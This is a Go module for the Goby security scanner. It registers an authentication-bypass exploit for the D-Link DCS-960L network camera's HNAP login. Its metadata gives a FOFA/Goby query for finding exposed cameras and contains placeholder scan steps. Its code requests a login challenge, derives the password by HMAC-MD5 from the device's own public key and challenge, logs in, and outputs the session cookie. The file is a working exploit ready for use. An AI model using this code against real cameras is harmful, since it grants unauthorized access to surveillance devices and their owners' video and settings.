package exploits

import (
	"crypto/hmac"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "D-Link DCS-960L HNAP LoginPassword Authentication Bypass Vulnerability",
    "Description": "<p>D-Link DCS-960L is a network camera product of China Taiwan D-Link Company.</p><p>When D-Link DCS-960L processes the HNAP login request, the processing logic of the parameter LoginPassword is wrong, and the attacker can construct a special login request to bypass the login verification.</p>",
    "Product": "D_Link-DCS-960L",
    "Homepage": "http://www.dlink.com.cn/",
    "DisclosureDate": "2023-01-03",
    "Author": "corp0ra1",
    "FofaQuery": "header=\"DCS-960L\" || banner=\"DCS-960L\"",
    "GobyQuery": "header=\"DCS-960L\" || banner=\"DCS-960L\"",
    "Level": "2",
    "Impact": "<p>When D-Link DCS-960L processes the HNAP login request, the processing logic of the parameter LoginPassword is wrong, and the attacker can construct a special login request to bypass the login verification.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://dlink.com/\">https://dlink.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "D-Link DCS-960L HNAP LoginPassword 认证绕过漏洞",
            "Product": "D_Link-DCS-960L",
            "Description": "<p>D-Link DCS-960L是中国台湾友讯（D-Link）公司的一款网络摄像头产品。</p><p>D-Link DCS-960L 在处理 HNAP 登录请求时，对于参数 LoginPassword 的处理逻辑错误，攻击者可以构造特殊的登录请求实现登录验证绕过。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://dlink.com/\">https://dlink.com/</a><br></p>",
            "Impact": "<p>D-Link DCS-960L 在处理 HNAP 登录请求时，对于参数 LoginPassword 的处理逻辑错误，攻击者可以构造特殊的登录请求实现登录验证绕过。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "D-Link DCS-960L HNAP LoginPassword Authentication Bypass Vulnerability",
            "Product": "D_Link-DCS-960L",
            "Description": "<p>D-Link DCS-960L is a network camera product of China Taiwan D-Link Company.<br></p><p>When D-Link DCS-960L processes the HNAP login request, the processing logic of the parameter LoginPassword is wrong, and the attacker can construct a special login request to bypass the login verification.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://dlink.com/\">https://dlink.com/</a><br></p>",
            "Impact": "<p>When D-Link DCS-960L processes the HNAP login request, the processing logic of the parameter LoginPassword is wrong, and the attacker can construct a special login request to bypass the login verification.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10786"
}`

	MD5_Hmachasd111 := func(key, data string) string {
		hmac := hmac.New(md5.New, []byte(key))
		hmac.Write([]byte(data))
		return hex.EncodeToString(hmac.Sum([]byte("")))
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/HNAP1/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("SOAPAction", "\"http://purenetworks.com/HNAP1/Login\"")
			cfg.Data = `<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>CataLpa</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>`
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "<Challenge>") {

				Challenge := regexp.MustCompile("<Challenge>(.*?)</Challenge>").FindStringSubmatch(resp.RawBody)
				Cookie := regexp.MustCompile("<Cookie>(.*?)</Cookie>").FindStringSubmatch(resp.RawBody)
				PublicKey := regexp.MustCompile("<PublicKey>(.*?)</PublicKey>").FindStringSubmatch(resp.RawBody)
				PublicKey1 := strings.ToUpper(MD5_Hmachasd111(PublicKey[1], Challenge[1]))
				passwd1 := strings.ToUpper(MD5_Hmachasd111(PublicKey1, Challenge[1]))
				Password := passwd1
				uri2 := "/HNAP1/"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("SOAPAction", "\"http://purenetworks.com/HNAP1/Login\"")
				cfg2.Header.Store("Cookie", fmt.Sprintf("uid=%s;", Cookie[1]))
				cfg2.Data = fmt.Sprintf("<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><Login xmlns=\"http://purenetworks.com/HNAP1/\"><Action>login</Action><Username>CataLpa</Username><LoginPassword>%s</LoginPassword></Login></soap:Body></soap:Envelope>", Password)
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return strings.Contains(resp2.RawBody, "<LoginResult>success</LoginResult>")

				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/HNAP1/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("SOAPAction", "\"http://purenetworks.com/HNAP1/Login\"")
			cfg.Data = `<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>CataLpa</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>`
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "<Challenge>") {
				Challenge := regexp.MustCompile("<Challenge>(.*?)</Challenge>").FindStringSubmatch(resp.RawBody)
				Cookie := regexp.MustCompile("<Cookie>(.*?)</Cookie>").FindStringSubmatch(resp.RawBody)
				PublicKey := regexp.MustCompile("<PublicKey>(.*?)</PublicKey>").FindStringSubmatch(resp.RawBody)
				PublicKey1 := strings.ToUpper(MD5_Hmachasd111(PublicKey[1], Challenge[1]))
				passwd1 := strings.ToUpper(MD5_Hmachasd111(PublicKey1, Challenge[1]))
				Password := passwd1
				uri2 := "/HNAP1/"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("SOAPAction", "\"http://purenetworks.com/HNAP1/Login\"")
				cfg2.Header.Store("Cookie", fmt.Sprintf("uid=%s;", Cookie[1]))
				cfg2.Data = fmt.Sprintf("<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><Login xmlns=\"http://purenetworks.com/HNAP1/\"><Action>login</Action><Username>CataLpa</Username><LoginPassword>%s</LoginPassword></Login></soap:Body></soap:Envelope>", Password)
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && strings.Contains(resp2.RawBody, "<LoginResult>success</LoginResult>"){
					expResult.Output = fmt.Sprintf("Cookie :uid=%s;", Cookie[1])
					expResult.Success = true

				}
			}
			return expResult
		},
	))
}
